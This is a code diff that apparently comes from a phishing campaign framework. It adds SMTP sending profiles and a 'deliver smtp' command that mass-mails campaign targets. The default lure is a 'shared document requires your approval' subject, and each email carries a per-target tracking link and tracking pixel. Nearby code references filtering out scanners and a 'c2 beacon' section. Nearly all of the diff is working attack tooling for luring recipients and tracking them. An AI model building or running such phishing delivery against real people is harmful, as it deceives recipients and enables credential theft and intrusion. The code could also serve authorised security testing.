@@ -23,6 +23,7 @@ class DeliveryCommands:
             port=_num(self.flags, "port", 8080, int),
             base_url=str(self.flags.get("url", "")),
             filter_scanners=bool(self.flags.get("filter", False)),
+            upstream=str(self.flags.get("upstream", "")),
         )
         run_async(
             server.serve_forever(
@@ -39,6 +40,9 @@ class DeliveryCommands:
 
         self._need(3, "deliver <provider> <campaign> [--token X] [--message M]")
         provider, ref = self.pos[1], self.pos[2]
+        if provider == "smtp":
+            self._deliver_smtp()
+            return
         camp = self._campaign(ref)
         base = self._base(camp)
         if not base:
@@ -99,6 +103,135 @@ class DeliveryCommands:
                 continue
             self.store.set_status(t["token"], "delivered" if delivered else "dead")
         ok("delivery finished")
+
+    # ─── smtp profile delivery ───
+
+    def cmd_sendprofile(self) -> None:
+        from .smtp_send import TLS_MODES, SmtpProfile
+
+        self._need(2, "sendprofile add|list|remove <name> [--host H --port P]")
+        action = self.pos[1].lower()
+        if action == "list":
+            profiles = self.store.list_send_profiles()
+            for entry in profiles:
+                cfg = entry["config"]
+                text(
+                    f"  {entry['name']}  smtp://{cfg.get('user', '')}@"
+                    f"{cfg.get('host', '')}:{cfg.get('port', '')} "
+                    f"tls={cfg.get('tls', '')} from={cfg.get('sender', '')}"
+                )
+            if not profiles:
+                text("  (no profiles — sendprofile add <name> --host H)")
+            return
+        self._need(3, f"sendprofile {action} <name>")
+        name = self.pos[2]
+        if action == "remove":
+            removed = self.store.remove_send_profile(name)
+            if not removed:
+                raise SystemExit(f"no such profile: {name}")
+            ok(f"profile removed: {name}")
+            return
+        if action != "add":
+            raise SystemExit(f"unknown action: {action}")
+        host = str(self.flags.get("host", ""))
+        if not host:
+            raise SystemExit("--host required")
+        tls = str(self.flags.get("tls", "starttls"))
+        if tls not in TLS_MODES:
+            raise SystemExit(f"tls must be one of {TLS_MODES}")
+        profile = SmtpProfile(
+            host=host,
+            port=_num(self.flags, "port", 587, int),
+            user=str(self.flags.get("user", "")),
+            sender=str(self.flags.get("from", "")),
+            tls=tls,
+        )
+        self.store.set_send_profile(name, profile.to_config())
+        ok(f"profile saved: {name} ({profile.host}:{profile.port} {profile.tls})")
+
+    def _deliver_smtp(self) -> None:
+        from .smtp_send import SmtpProfile, SmtpSender, build_message
+
+        self._need(3, "deliver smtp <campaign> [--profile P | --host H]")
+        camp = self._campaign(self.pos[2])
+        base = self._base(camp)
+        if not base:
+            raise SystemExit("--url required (or set it on the campaign)")
+        name = str(self.flags.get("profile", ""))
+        profile: SmtpProfile | None = None
+        if name:
+            config = self.store.get_send_profile(name)
+            if not config:
+                raise SystemExit(f"no such profile: {name}")
+            profile = SmtpProfile.from_config(config)
+        else:
+            host = str(self.flags.get("host", ""))
+            if not host:
+                raise SystemExit("--profile or --host required")
+            profile = SmtpProfile(
+                host=host,
+                port=_num(self.flags, "port", 587, int),
+                user=str(self.flags.get("user", "")),
+                sender=str(self.flags.get("from", "")),
+                tls=str(self.flags.get("tls", "starttls")),
+            )
+        password = resolve_secret(
+            str(self.flags.get("pass", "")), "CF_SMTP_PASS", "smtp password: "
+        )
+        subject = str(
+            self.flags.get(
+                "subject", "{label}: shared document requires your approval"
+            )
+        )
+        message = str(
+            self.flags.get(
+                "message",
+                "Shared with you: <b>{label}</b><br>Open {url} to view.",
+            )
+        )
+        fields: dict[str, Any] = {}
+        for item in _as_list(self.flags.get("field")):
+            if "=" in str(item):
+                k, v = str(item).split("=", 1)
+                fields[k] = v
+        rows = self.store.targets(camp["id"])
+        if self.flags.get("only"):
+            only = set(_as_list(self.flags["only"]))
+            rows = [t for t in rows if t["token"] in only]
+        if not rows:
+            raise SystemExit("no targets")
+        sender = SmtpSender(profile, password)
+        batch: list[tuple[str, Any]] = []
+        tokens: list[str] = []
+        for t in rows:
+            token = t["token"]
+            url = f"{base}/l/{token}"
+            label = t["label"] or t["email"] or "file"
+            body = str(message).format(label=label, url=url, token=token, **fields)
+            subj = subject.format(label=label, url=url, token=token, **fields)
+            batch.append(
+                (
+                    str(t["email"]),
+                    build_message(
+                        sender=profile.sender or profile.user or "share@example.com",
+                        to=str(t["email"]),
+                        subject=subj,
+                        body=body,
+                        pixel_url=f"{base}/t/{token}.gif",
+                    ),
+                )
+            )
+            tokens.append(token)
+        outcome = sender.send_batch(batch)
+        for token, to in zip(tokens, [b[0] for b in batch]):
+            delivered = outcome.get(to, False)
+            self.store.set_status(token, "delivered" if delivered else "dead")
+            if delivered:
+                self.store.record_hit(token, "smtp:send")
+            self.store.log_event(
+                token, camp["id"], "smtp:" + ("ok" if delivered else "fail"), to
+            )
+        ok(f"smtp delivery: {sum(outcome.values())}/{len(outcome)} sent")
 
     # ─── c2 beacon ───
 
